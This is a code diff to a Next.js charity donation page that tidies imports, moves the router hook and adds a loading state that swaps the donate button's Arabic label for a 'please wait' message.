@@ -8,10 +8,8 @@ import { Footer } from "@/components/footer"
 import { useEffect, useState } from "react"
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
-import { FullPageLoader } from "@/components/fullpageloader"
 import { getFirestore, doc, onSnapshot } from "firebase/firestore"
 import { Card } from "@/components/ui/card"
-import Image from "next/image"
 
 
 const paymentMethods = [
@@ -61,15 +59,16 @@ export default function CharityDonationPage() {
   const [value, setValue] = useState(10)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
   const [country, setCountry] = useState("")
-  const router = useRouter()
   const [showError, setShowError] = useState(false)
   const [selectedMethod, setSelectedMethod] = useState(3) // Default to KNet (id: 3) as selected
+  const [loading, setLoading] = useState(false)
 
   // Add these state variables at the top of the component with the other state declarations
   const [projectTotal, setProjectTotal] = useState("970.000")
   const [projectPaid, setProjectPaid] = useState("152.670")
   const [projectRemaining, setProjectRemaining] = useState("817.330")
   const [progressPercentage, setProgressPercentage] = useState(15)
+  const router = useRouter()
 
   useEffect(() => {
     const data = {
@@ -378,7 +377,7 @@ export default function CharityDonationPage() {
               }}
               className="w-full bg-teal-600 hover:bg-teal-700 text-white py-3 rounded-md"
             >
-              تبرع
+             {loading?' ... يرجى الأنتظار':'تبرع'}
             </Button>
           </div>
     </div>
